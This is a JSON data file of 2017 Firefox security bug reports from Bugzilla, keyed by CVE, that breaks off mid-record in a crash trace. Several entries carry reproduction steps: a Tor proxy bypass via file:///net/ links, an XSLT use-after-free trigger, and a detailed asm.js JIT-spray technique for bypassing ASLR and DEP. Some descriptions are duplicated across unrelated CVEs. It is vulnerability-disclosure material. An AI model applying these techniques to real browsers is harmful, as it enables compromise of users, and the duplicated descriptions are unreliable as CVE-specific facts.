{
  "year": 2017,
  "total": 163,
  "reference": "bugzilla.mozilla.org",
  "reports": {
    "CVE-2017-16541": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1412081",
        "title": "(CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux",
        "description": "Tor Project received a third-party report of a method for content pages to bypass the proxy. STR: Create a web page with the following: <head> <link href='file:///net/12.12.12.12/a.css' rel='stylesheet'> </head> Run a \"tcpdump port 111\" on 12.12.12.12. UDP events are observed that did not pass through the browser proxy. (A demo is at https://pearlcrescent.com/tor/am.html) I also observed the same thing for <img> tags. This behavior apparently is caused by automount/autofs, which is enabled by default on macOS and installable on Linux. More information from a colleague: My quick test on OSX 10.12.x shows that Chrome and Safari (latest versions) are not affected. It is also interesting that I see the following message in the browser console after the page load completes (i.e., after it gives up on the automounted file): Security Error: Content at https://pearlcrescent.com/tor/am.html may not load or link to file:///net/192.168.1.43/a.css. Access is blocked (i.e., the CSS does not load, the image does not load), but only after an attempt has been made to open the file (or maybe just traverse its path."
      }
    ],
    "CVE-2017-5031": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1328762",
        "title": "Invalid read @ libGLESv2.dll!rx::Image11::disassociateStorage() | Assertion failure: !err",
        "description": "Windows 7 32bit show a EXCEPTION_ACCESS_VIOLATION_READ crash rated high exploitable on https://sketchfab.com/models/7346263a68554cb3b536a872d5868374 https://sketchfab.com/models/9958172a6fd74610922a3a5fcb3e0850 Both Windows 7 and 10 32bit also show OOM crashes so you may need to work at it to get the actual Angle crash. I also see the following on 32bit Windows. Assertion failure: !err, at c:/builds/moz2_slave/m-beta-w32-d-00000000000000000/build/src/dom/canvas/WebGLContextDraw.cpp:739 The stacks for the assertions are short, symbol-less and pretty useless. Nightly/53 Linux 64bit showed a nullptr crash Operating system: Linux 0.0.0 Linux 4.8.15-300.fc25.x86_64 #1 SMP Thu Dec 15 23:10:23 UTC 2016 x86_64 CPU: amd64 family 6 model 45 stepping 2 2 CPUs GPU: UNKNOWN Crash reason: SIGSEGV Crash address: 0x0 Process uptime: not available Thread 0 (crashed) 0 libxul.so!mozilla::WebGLTexture::TexImage [WebGLTextureUpload.cpp:45f796204c54 : 1303 + 0x24] rax = 0x0000000000000000 rdx = 0x0000000000000000 rcx = 0x0000000000000b40 rbx = 0x00007f050f1d0000 rsi = 0x00007f0546f43730 rdi = 0x00007f0538bc5b8a rbp = 0x00007ffca2ceae00 rsp = 0x00007ffca2cead50 r8 = 0x00007f0546f43730 r9 = 0x00007f0548020740 r10 = 0x0000000000000073 r11 = 0x0000000000000000 r12 = 0x00007f050f1c9c80 r13 = 0x00007ffca2ceafb5 r14 = 0x00007ffca2cead88 r15 = 0x00007f050f1935a8 rip = 0x00007f05368aac97"
      }
    ],
    "CVE-2017-5373": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1322315%2C1328834%2C1322420%2C1285833%2C1285960%2C1328251%2C1331058%2C1325938%2C1325877",
        "description": "Windows 7 32bit show a EXCEPTION_ACCESS_VIOLATION_READ crash rated high exploitable on https://sketchfab.com/models/7346263a68554cb3b536a872d5868374 https://sketchfab.com/models/9958172a6fd74610922a3a5fcb3e0850 Both Windows 7 and 10 32bit also show OOM crashes so you may need to work at it to get the actual Angle crash. I also see the following on 32bit Windows. Assertion failure: !err, at c:/builds/moz2_slave/m-beta-w32-d-00000000000000000/build/src/dom/canvas/WebGLContextDraw.cpp:739 The stacks for the assertions are short, symbol-less and pretty useless. Nightly/53 Linux 64bit showed a nullptr crash Operating system: Linux 0.0.0 Linux 4.8.15-300.fc25.x86_64 #1 SMP Thu Dec 15 23:10:23 UTC 2016 x86_64 CPU: amd64 family 6 model 45 stepping 2 2 CPUs GPU: UNKNOWN Crash reason: SIGSEGV Crash address: 0x0 Process uptime: not available Thread 0 (crashed) 0 libxul.so!mozilla::WebGLTexture::TexImage [WebGLTextureUpload.cpp:45f796204c54 : 1303 + 0x24] rax = 0x0000000000000000 rdx = 0x0000000000000000 rcx = 0x0000000000000b40 rbx = 0x00007f050f1d0000 rsi = 0x00007f0546f43730 rdi = 0x00007f0538bc5b8a rbp = 0x00007ffca2ceae00 rsp = 0x00007ffca2cead50 r8 = 0x00007f0546f43730 r9 = 0x00007f0548020740 r10 = 0x0000000000000073 r11 = 0x0000000000000000 r12 = 0x00007f050f1c9c80 r13 = 0x00007ffca2ceafb5 r14 = 0x00007ffca2cead88 r15 = 0x00007f050f1935a8 rip = 0x00007f05368aac97"
      }
    ],
    "CVE-2017-5374": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1325344%2C1317501%2C1311319%2C1329989%2C1300145%2C1322305%2C1288561%2C1295747%2C1318766%2C1297808%2C1321374%2C1324810%2C1313385%2C1319888%2C1302231%2C1307458%2C1293327%2C1315447%2C1319456",
        "description": "Windows 7 32bit show a EXCEPTION_ACCESS_VIOLATION_READ crash rated high exploitable on https://sketchfab.com/models/7346263a68554cb3b536a872d5868374 https://sketchfab.com/models/9958172a6fd74610922a3a5fcb3e0850 Both Windows 7 and 10 32bit also show OOM crashes so you may need to work at it to get the actual Angle crash. I also see the following on 32bit Windows. Assertion failure: !err, at c:/builds/moz2_slave/m-beta-w32-d-00000000000000000/build/src/dom/canvas/WebGLContextDraw.cpp:739 The stacks for the assertions are short, symbol-less and pretty useless. Nightly/53 Linux 64bit showed a nullptr crash Operating system: Linux 0.0.0 Linux 4.8.15-300.fc25.x86_64 #1 SMP Thu Dec 15 23:10:23 UTC 2016 x86_64 CPU: amd64 family 6 model 45 stepping 2 2 CPUs GPU: UNKNOWN Crash reason: SIGSEGV Crash address: 0x0 Process uptime: not available Thread 0 (crashed) 0 libxul.so!mozilla::WebGLTexture::TexImage [WebGLTextureUpload.cpp:45f796204c54 : 1303 + 0x24] rax = 0x0000000000000000 rdx = 0x0000000000000000 rcx = 0x0000000000000b40 rbx = 0x00007f050f1d0000 rsi = 0x00007f0546f43730 rdi = 0x00007f0538bc5b8a rbp = 0x00007ffca2ceae00 rsp = 0x00007ffca2cead50 r8 = 0x00007f0546f43730 r9 = 0x00007f0548020740 r10 = 0x0000000000000073 r11 = 0x0000000000000000 r12 = 0x00007f050f1c9c80 r13 = 0x00007ffca2ceafb5 r14 = 0x00007ffca2cead88 r15 = 0x00007f050f1935a8 rip = 0x00007f05368aac97"
      }
    ],
    "CVE-2017-5375": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1325200",
        "title": "lack of executable-code quota allows full bypass of ASLR and DEP",
        "description": "asm.js allows to JIT-spray attacker controlled code, and hence, allows to fully bypass ASLR and DEP in 32-bit (x86) Firefox (Tested versions: Release and Nightly). As it is very easy to find, I do not know if it is already known (I hope I do not reinvent the wheel here...) In summary this means, that an attacker can exploit a memory corruption vulnerability (such as an UAF) as if no ASLR and DEP existed. He only needs EIP control and does not need any memory disclosures/info-leaks or code-reuse. That makes exploitation of memory corruptions for an attacker super easy. Consider following asm.js script: <script> function asm_js_module(){ \"use asm\" function asm_js_function(){ /* attacker controlled asm.js code */ } return asm_js_function } modules = [] /* create 0x1000 executable regions containing our code */ for (i=0; i<0x1000; i++){ /* request asm.js module */ modules[i] = asm_js_module() } </script> Each time an asm.js module is requested, VirtualAlloc is called and returns a new RW (PAGE_READWRITE) region aligned to 0xXXXX0000. At that point the call stack looks like this (Firefox 50.1.0): 0:000> kP a # ChildEBP RetAddr 00 008fe060 670ef66e KERNEL32!VirtualAllocStub 01 (Inline) -------- xul!js::jit::AllocateExecutableMemory+0x10 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\js\\src\\jit\\executableallocatorwin.cpp @ 190] 02 008fe078 670f65c7 xul!AllocateCodeSegment( class js::ExclusiveContext * cx = 0x04516000, unsigned int totalLength = <Value unavailable error>)+0x23 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\js\\src\\asmjs\\wasmcode.cpp @ 67] 03 008fe0b8 670de070 xul!js::wasm::CodeSegment::create( struct JSContext * cx = 0x04516000, class mozilla::Vector<unsigned char,0,js::SystemAllocPolicy> * bytecode = 0x08c61008, struct js::wasm::LinkData * linkData = 0x08c61020, struct js::wasm::Metadata * metadata = 0x06ab68d0, class JS::Handle<js::WasmMemoryObject *> memory = class JS::Handle<js::WasmMemoryObject *>)+0x67 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\js\\src\\asmjs\\wasmcode.cpp @ 206] 04 008fe184 6705f99d xul!js::wasm::Module::instantiate( struct JSContext * cx = 0x04516000, class JS::Handle<JS::GCVector<JSFunction *,0,js::TempAllocPolicy> > funcImports = class JS::Handle<JS::GCVector<JSFunction *,0,js::TempAllocPolicy> >, class JS::Handle<js::WasmTableObject *> tableImport = class JS::Handle<js::WasmTableObject *>, class JS::Handle<js::WasmMemoryObject *> memoryImport = class JS::Handle<js::WasmMemoryObject *>, class mozilla::Vector<js::wasm::Val,0,js::SystemAllocPolicy> * globalImports = 0x008fe200, class JS::Handle<JSObject *> instanceProto = class JS::Handle<JSObject *>, class JS::MutableHandle<js::WasmInstanceObject *> instanceObj = class JS::MutableHandle<js::WasmInstanceObject *>)+0x94 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\js\\src\\asmjs\\wasmmodule.cpp @ 689] 05 008fe260 6705aae6 xul!TryInstantiate( struct JSContext * cx = 0x04516000, class JS::CallArgs args = class JS::CallArgs, class js::wasm::Module * module = 0x08c61000, struct js::AsmJSMetadata * metadata = 0x06ab68d0, class JS::MutableHandle<js::WasmInstanceObject *> instanceObj = class JS::MutableHandle<js::WasmInstanceObject *>, class JS::MutableHandle<JSObject *> exportObj = class JS::MutableHandle<JSObject *>)+0x1e6 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\js\\src\\asmjs\\asmjs.cpp @ 7894] 06 008fe2c4 35713638 xul!InstantiateAsmJS( struct JSContext * cx = 0x04516000, unsigned int argc = 0, class JS::Value * vp = 0x008fe2f0)+0x88 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\js\\src\\asmjs\\asmjs.cpp @ 8008] Afterwards, the asm.js compiled/native code is copied to the RW region (firefox-50.1.0/js/src/asmjs/WasmCode.cpp:223 in method CodeSegment::create): 223 memcpy(cs->code(), bytecode.begin(), bytecode.length()); 224 StaticallyLink(*cs, linkData, cx); 225 if (memory) 226 SpecializeToMemory(*cs, metadata, memory); 227 } 228 229 if (!ExecutableAllocator::makeExecutable(cs->code(), cs->codeLength())) { And in line 229 the RW region is made executable (PAGE_EXECUTE_READ) with ExecutableAllocator::makeExecutable which calls VirtualProtect. An attacker can request one asm.js module many times, which leads to the creation of many RX regions. Due to the allocation granularity of VirtualAlloc he can then choose a fixed address (such as 0x1c1c0000) and can be certain that his compiled/native asm.js code is located there. IMO following flaws/missing checks are responsible that asm.js JIT-spray is possible. Some of them are well known: 1) Not MANY, but only ONE RX region should be created per module. Many requests to one asm.js module should return references instead of new RX regions. 2.1) Constant folding is missing in Release (50.1.0). (But it seems it was added in Nightly between 18 Nov. 2016 and 30 Nov. 2016). This makes it possible to use many subsequent arithmetic operations on one variable and wrap the legitimate instructions. For example, we can hide three NOPS (0x90) in asm.js constants with: VAL = (VAL + 0xA8909090)|0; VAL = (VAL + 0xA8909090)|0; Following native code is generated: 00: 05909090A8 ADD EAX, 0xA8909090 05: 05909090A8 ADD EAX, 0xA8909090 When we jump into offset 01 (the immediate of the first instruction) we can execute our hidden code (We'll use 0xA8 as masking byte): 01: 90 NOP 02: 90 NOP 03: 90 NOP 04: A805 TEST AL, 05 06: 90 NOP 07: 90 NOP 08: 90 NOP 09: A8... 2.2) Although constant folding/propagation seems to be implemented in Nightly, an attacker can still force to emit his hidden code: for example, he can hide two nops and a jump to the next constant with following asm.js code: asm_js_heap[0x10] = 0xEB069090; asm_js_heap[0x11] = 0xEB069090; asm.js emits following native code: 00: B89090EB06 MOV EAX, 0x06EB9090 05: A340C07B04 MOV DWORD [0x047BC040], EAX 0A: B89090EB06 MOV EAX, 0x06EB9090 0F: A344C07B04 MOV DWORD [0x047BC044], EAX But when we jump into offset 01, we get: 01: 90 NOP 02: 90 NOP 03: EB06 JMP 0x0B .. 0B: 90 NOP 0C: 90 NOP 0D: EB06 JMP 0x15 .. 2.3) Another possibility is to use FFI and pass many parameters to it. Consider following asm.js code: heap[10] = ffi(0x90909090|0, 0x90909090|0, 0x90909090|0, 0x90909090|0, /* and many more*/ ) Following native code is emitted (Nightly 53.0a1 20161215061212 32-bit - Windows 10): 0:026> u 1c1c0053 1c1c0053 90 nop 1c1c0054 90 nop 1c1c0055 90 nop 1c1c0056 c744240c90909090 mov dword ptr [esp+0Ch],90909090h 1c1c005e c744241090909090 mov dword ptr [esp+10h],90909090h 1c1c0066 c744241490909090 mov dword ptr [esp+14h],90909090h 1c1c006e c744241890909090 mov dword ptr [esp+18h],90909090h 1c1c0076 c744241c90909090 mov dword ptr [esp+1Ch],90909090h This again allows to use two bytes as payload bytes and two bytes as jump to the next constant. 3) There is no constant blinding of 4-byte constants. Hence, an attacker can use the well known trick to hide his opcodes/payload/shellcode within the constants (as shown in 2.1, 2.2, 2.3). 4) There is insufficient random nop insertion. It seems that the same amount and type of nops are emitted for a specific module. That means, that the native code of one module is fully predictable. An attacker can test his code and use it across other machines with the same OS/Firefox version (am I missing here sth.?). Better random nop insertion would break 2.1, 2.2, 2.3. More random base addresses, each time the same module is used would help, too. Separating code from data such as using a constant pool for constants might also help. To demonstrate that this asm.js JIT-spray works, I attached several proof of concepts for Windows 8.1 and Windows 10 (including an exploit for CVE-2016-9079, the recent Tor Browser 0day). I have also exploits for CVE-2016-1960 and CVE-2016-2819, but the attached PoCs should proof the point. Information how to test them is available in the PoCs. Principally, asm.js JIT-spray should work for Linux, too. However, mmap returns regions on a 4 KB granularity, hence more modules need to be sprayed to occupy a predictable address. I did not investigate any possibilities for 64-bit Firefox. However it might also be affected in one or another way. I think JIT hardening was also tracked by https://bugzilla.mozilla.org/show_bug.cgi?id=677272. Please correct me if anything is wrong or if I missed something. Or ping me if one of the PoCs does not work or if you need more information. More general information about JIT-spray can be found here: https://packetstormsecurity.com/files/86975/Writing-JIT-Spray-Shellcode.pdf http://zhodiac.hispahack.com/my-stuff/security/Flash_Jit_InfoLeak_Gadgets.pdf https://www.nccgroup.trust/globalassets/resources/us/presentations/documents/attacking_clientside_jit_compilers.pdf https://www.nccgroup.trust/globalassets/resources/us/presentations/documents/attacking_clientside_jit_compilers_paper.pdf https://media.blackhat.com/bh-us-11/Tsai/BH_US_11_TsaiPan_Weapons_Targeted_Attack_Slides.pdf https://erpscan.com/wp-content/uploads/2012/06/HITB-JIT-Spray-Attacks-and-Advanced-Shellcode.pdf http://xlab.tencent.com/en/2015/12/09/bypass-dep-and-cfg-using-jit-compiler-in-chakra-engine/ https://sites.google.com/site/bingsunsec/WARPJIT/JIT%20Spraying%20Never%20Dies%20-%20Bypass%20CFG%20By%20Leveraging%20WARP%20Shader%20JIT%20Spraying.pdf Best, Rh0"
      }
    ],
    "CVE-2017-5376": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1311687",
        "title": "ASan heap UAF via xsl:key and xsl:variable",
        "description": "Tested with XPCshell \"JavaScript-C52.0a1\" [+] XML document <foo /> [+] XSLT code <xsl:transform xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" version=\"2.0\"> <xsl:variable name=\"v\"> <xsl:foobar /> </xsl:variable> <xsl:key match=\"/\" name=\"k\" use=\"$v\" /> <xsl:template match=\"/\"> <xsl:value-of select=\"key('k', '/')\" /> </xsl:template> </xsl:transform> [+] ASan output ==2814==ERROR: AddressSanitizer: heap-use-after-free on address 0x60300006c160 at pc 0x7f1c68baee30 bp 0x7ffdb6bc1ca0 sp 0x7ffdb6bc1c98 READ of size 8 at 0x60300006c160 thread T0 #0 0x7f1c68baee2f in txExecutionState::~txExecutionState() /home/worker/workspace/build/src/dom/xslt/xslt/txExecutionState.cpp:98:5 #1 0x7f1c68be6535 in txMozillaXSLTProcessor::TransformToDoc(nsIDOMDocument**, bool) /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:700:1 #2 0x7f1c68bec01b in TransformToDocument /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:644:12 #3 0x7f1c68bec01b in txMozillaXSLTProcessor::TransformToDocument(nsINode&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:1321 #4 0x7f1c6699d27d in mozilla::dom::XSLTProcessorBinding::transformToDocument(JSContext*, JS::Handle<JSObject*>, txMozillaXSLTProcessor*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/XSLTProcessorBinding.cpp:154:43 #5 0x7f1c671ce5a0 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2857:13 #6 0x7f1c6d3c2a35 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #7 0x7f1c6d3c2a35 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:446 #8 0x7f1c6d3a8dda in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:509:12 #9 0x7f1c6d3a8dda in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #10 0x7f1c6d38dbd3 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:404:12 #11 0x7f1c6d3c5282 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:685:15 #12 0x7f1c6d3c5b1b in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:717:12 #13 0x7f1c6cecac60 in JS_ExecuteScript(JSContext*, JS::Handle<JSScript*>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:4333:12 #14 0x7f1c6417b809 in ProcessFile(mozilla::dom::AutoJSAPI&, char const*, _IO_FILE*, bool) /home/worker/workspace/build/src/js/xpconnect/src/XPCShellImpl.cpp:886:31 #15 0x7f1c6417bea2 in Process(mozilla::dom::AutoJSAPI&, char const*, bool) /home/worker/workspace/build/src/js/xpconnect/src/XPCShellImpl.cpp:943:15 #16 0x7f1c6415a0fb in ProcessArgs /home/worker/workspace/build/src/js/xpconnect/src/XPCShellImpl.cpp:1144:16 #17 0x7f1c6415a0fb in XRE_XPCShellMain /home/worker/workspace/build/src/js/xpconnect/src/XPCShellImpl.cpp:1578 #18 0x4defbc in main /home/worker/workspace/build/src/js/xpconnect/shell/xpcshell.cpp:62:18 #19 0x7f1c5d56382f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #20 0x41b958 in _start (/work/firefox/bin/xpcshell+0x41b958) 0x60300006c160 is located 0 bytes inside of 24-byte region [0x60300006c160,0x60300006c178) freed by thread T0 here: #0 0x4b20ab in free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7f1c68bc7d4b in txXSLKey::testNode(txXPathNode const&, txKeyValueHashKey&, nsTHashtable<txKeyValueHashEntry>&, txExecutionState&) /home/worker/workspace/build/src/dom/xslt/xslt/txKeyFunctionCall.cpp:353:13 #2 0x7f1c68bc7441 in txXSLKey::indexTree(txXPathNode const&, txKeyValueHashKey&, nsTHashtable<txKeyValueHashEntry>&, txExecutionState&) /home/worker/workspace/build/src/dom/xslt/xslt/txKeyFunctionCall.cpp:299:19 #3 0x7f1c68bc6e93 in txXSLKey::indexSubtreeRoot(txXPathNode const&, nsTHashtable<txKeyValueHashEntry>&, txExecutionState&) /home/worker/workspace/build/src/dom/xslt/xslt/txKeyFunctionCall.cpp:283:12 #4 0x7f1c68bb251e in txKeyHash::getKeyNodes(txExpandedName const&, txXPathNode const&, nsAString_internal const&, bool, txExecutionState&, txNodeSet**) /home/worker/workspace/build/src/dom/xslt/xslt/txKeyFunctionCall.cpp:221:19 #5 0x7f1c68bc656a in getKeyNodes /home/worker/workspace/build/src/dom/xslt/xslt/txExecutionState.cpp:425:12 #6 0x7f1c68bc656a in txKeyFunctionCall::evaluate(txIEvalContext*, txAExprResult**) /home/worker/workspace/build/src/dom/xslt/xslt/txKeyFunctionCall.cpp:89 #7 0x7f1c68bc550a in txValueOf::execute(txExecutionState&) /home/worker/workspace/build/src/dom/xslt/xslt/txInstructions.cpp:929:19 #8 0x7f1c68c1c30d in txXSLTProcessor::execute(txExecutionState&) /home/worker/workspace/build/src/dom/xslt/xslt/txXSLTProcessor.cpp:49:14 #9 0x7f1c68be6138 in txMozillaXSLTProcessor::TransformToDoc(nsIDOMDocument**, bool) /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:675:14 #10 0x7f1c68bec01b in TransformToDocument /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:644:12 #11 0x7f1c68bec01b in txMozillaXSLTProcessor::TransformToDocument(nsINode&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:1321 #12 0x7f1c6699d27d in mozilla::dom::XSLTProcessorBinding::transformToDocument(JSContext*, JS::Handle<JSObject*>, txMozillaXSLTProcessor*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/XSLTProcessorBinding.cpp:154:43 #13 0x7f1c671ce5a0 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2857:13 #14 0x7f1c6d3c2a35 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #15 0x7f1c6d3c2a35 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:446 #16 0x7f1c6d3a8dda in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:509:12 #17 0x7f1c6d3a8dda in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #18 0x7f1c6d38dbd3 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:404:12 #19 0x7f1c6d3c5282 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:685:15 #20 0x7f1c6d3c5b1b in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:717:12 #21 0x7f1c6cecac60 in JS_ExecuteScript(JSContext*, JS::Handle<JSScript*>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:4333:12 #22 0x7f1c6417b809 in ProcessFile(mozilla::dom::AutoJSAPI&, char const*, _IO_FILE*, bool) /home/worker/workspace/build/src/js/xpconnect/src/XPCShellImpl.cpp:886:31 #23 0x7f1c6417bea2 in Process(mozilla::dom::AutoJSAPI&, char const*, bool) /home/worker/workspace/build/src/js/xpconnect/src/XPCShellImpl.cpp:943:15 #24 0x7f1c6415a0fb in ProcessArgs /home/worker/workspace/build/src/js/xpconnect/src/XPCShellImpl.cpp:1144:16 #25 0x7f1c6415a0fb in XRE_XPCShellMain /home/worker/workspace/build/src/js/xpconnect/src/XPCShellImpl.cpp:1578 #26 0x4defbc in main /home/worker/workspace/build/src/js/xpconnect/shell/xpcshell.cpp:62:18 #27 0x7f1c5d56382f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) previously allocated by thread T0 here: #0 0x4b23cb in __interceptor_malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x4df14d in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f1c68baf29c in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f1c68baf29c in txExecutionState::init(txXPathNode const&, txOwningExpandedNameMap<txIGlobalParameter>*) /home/worker/workspace/build/src/dom/xslt/xslt/txExecutionState.cpp:110 #4 0x7f1c68be6121 in txMozillaXSLTProcessor::TransformToDoc(nsIDOMDocument**, bool) /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:671:19 #5 0x7f1c68bec01b in TransformToDocument /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:644:12 #6 0x7f1c68bec01b in txMozillaXSLTProcessor::TransformToDocument(nsINode&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:1321 #7 0x7f1c6699d27d in mozilla::dom::XSLTProcessorBinding::transformToDocument(JSContext*, JS::Handle<JSObject*>, txMozillaXSLTProcessor*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/XSLTProcessorBinding.cpp:154:43 #8 0x7f1c671ce5a0 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2857:13 #9 0x7f1c6d3c2a35 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #10 0x7f1c6d3c2a35 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:446 #11 0x7f1c6d3a8dda in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:509:12 #12 0x7f1c6d3a8dda in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #13 0x7f1c6d38dbd3 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:404:12 #14 0x7f1c6d3c5282 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:685:15 #15 0x7f1c6d3c5b1b in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:717:12 #16 0x7f1c6cecac60 in JS_ExecuteScript(JSContext*, JS::Handle<JSScript*>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:4333:12 #17 0x7f1c6417b809 in ProcessFile(mozilla::dom::AutoJSAPI&, char const*, _IO_FILE*, bool) /home/worker/workspace/build/src/js/xpconnect/src/XPCShellImpl.cpp:886:31 #18 0x7f1c6417bea2 in Process(mozilla::dom::AutoJSAPI&, char const*, bool) /home/worker/workspace/build/src/js/xpconnect/src/XPCShellImpl.cpp:943:15 #19 0x7f1c6415a0fb in ProcessArgs /home/worker/workspace/build/src/js/xpconnect/src/XPCShellImpl.cpp:1144:16 #20 0x7f1c6415a0fb in XRE_XPCShellMain /home/worker/workspace/build/src/js/xpconnect/src/XPCShellImpl.cpp:1578 #21 0x4defbc in main /home/worker/workspace/build/src/js/xpconnect/shell/xpcshell.cpp:62:18 #22 0x7f1c5d56382f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/dom/xslt/xslt/txExecutionState.cpp:98:5 in txExecutionState::~txExecutionState()"
      }
    ],
    "CVE-2017-5377": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1306883",
        "title": "SEGV in sk_memset32 from SkLinearGradient::LinearGradientContext::shade4_dx_clamp",
        "description": "Tested on: OS: Ubuntu 16.04.1 LTS Firefox: ASAN-build moz_source_stamp: f713114b8c8d352b668b3e8052bc51ece4df34e0 prefs.js from https://github.com/MozillaSecurity/fuzzdata/blob/master/settings/firefox/prefs.js ASAN-trace: $./firefox firefox-SEGV-6f9-6f9-6f9-6f4-1ba0-min.html ATTENTION: default value of option force_s3tc_enable overridden by environment. ATTENTION: default value of option force_s3tc_enable overridden by environment. ASAN:DEADLYSIGNAL ================================================================= ==30297==ERROR: AddressSanitizer: SEGV on unknown address 0x7f07ea7d9628 (pc 0x7f0a1fac92aa bp 0x7fff76db3950 sp 0x7fff76db38c0 T0) #0 0x7f0a1fac92a9 in sk_memset32 /home/worker/workspace/build/src/gfx/skia/skia/src/core/SkUtils.h:31:19 #1 0x7f0a1fac92a9 in fill<false> /home/worker/workspace/build/src/gfx/skia/skia/src/effects/gradients/SkLinearGradient.cpp:538 #2 0x7f0a1fac92a9 in void SkLinearGradient::LinearGradientContext::shade4_dx_clamp<false, false>(unsigned int*, int, float, float, float, float const*) /home/worker/workspace/build/src/gfx/skia/skia/src/effects/gradients/SkLinearGradient.cpp:651 #3 0x7f0a1fabc2a4 in SkLinearGradient::LinearGradientContext::shade4_clamp(int, int, unsigned int*, int) /home/worker/workspace/build/src/gfx/skia/skia/src/effects/gradients/SkLinearGradient.cpp:750:13 #4 0x7f0a1fabbd6a in 